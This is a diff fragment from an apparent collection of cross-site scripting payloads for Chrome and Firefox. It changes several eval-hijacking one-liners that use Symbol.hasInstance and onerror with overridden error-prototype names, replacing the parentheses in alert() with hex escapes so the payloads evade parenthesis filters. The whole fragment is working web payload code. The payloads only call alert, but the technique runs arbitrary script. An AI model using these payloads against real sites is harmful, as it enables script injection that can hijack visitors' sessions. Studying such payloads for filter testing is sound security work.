@@ -126,7 +126,7 @@ onhashchange=setTimeout,HashChangeEvent.prototype[Symbol.toStringTag]=/=alert(2)
 
 // chrome + firefox
 
-Array.prototype[Symbol.hasInstance]=eval,'alert(3)'instanceof[]
+Array.prototype[Symbol.hasInstance]=eval,'alert\x283\x29'instanceof[]
 
 </script>
 
@@ -134,15 +134,16 @@ Array.prototype[Symbol.hasInstance]=eval,'alert(3)'instanceof[]
 
 // chrome
 
-[onerror=eval][TypeError.prototype.name='=/']['/-alert(4)//']
+[onerror=eval][TypeError.prototype.name='=/']['/-alert\x284\x29//']
 
 </script>
+
 
 <script>
 
 // chrome
 
-onerror=eval,ReferenceError.prototype.name='=alert(5)//',lol
+onerror=eval,ReferenceError.prototype.name='=alert\x285\x29//',lol
 
 </script>
 ```
